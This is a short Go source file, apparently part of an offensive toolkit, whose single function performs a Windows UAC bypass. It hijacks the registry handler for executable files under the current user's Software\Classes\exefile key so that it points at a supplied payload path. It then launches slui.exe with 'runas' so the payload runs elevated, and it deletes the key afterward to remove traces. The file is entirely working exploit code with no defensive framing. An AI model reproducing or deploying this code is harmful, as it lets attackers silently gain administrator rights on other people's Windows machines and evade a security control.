package models

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

//Need Administrator(full control)
func Slui_registry(File_path string) {
	fmt.Println(Version())
	subkey, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\exefile\Shell\open\command`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		fmt.Printf("[-] CreateKey err: %v", err)
		return
	}
	subkey.SetStringValue("", File_path)
	subkey.Close()
	shell32 := syscall.NewLazyDLL("Shell32.dll")
	shellExecuteW := shell32.NewProc("ShellExecuteW")
	runasStr, _ := syscall.UTF16PtrFromString("runas")
	sluiStr, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\slui.exe")
	r1, _, _ := shellExecuteW.Call(uintptr(0), uintptr(unsafe.Pointer(runasStr)), uintptr(unsafe.Pointer(sluiStr)), uintptr(0), uintptr(0), uintptr(1))
	if r1 < 32 {
		fmt.Println("[-] shellExecuteW err")
		return
	}
	time.Sleep(time.Second * 3)
	DeleteSubKeyTree("exefile")
	fmt.Println("[+] SL Done")
}
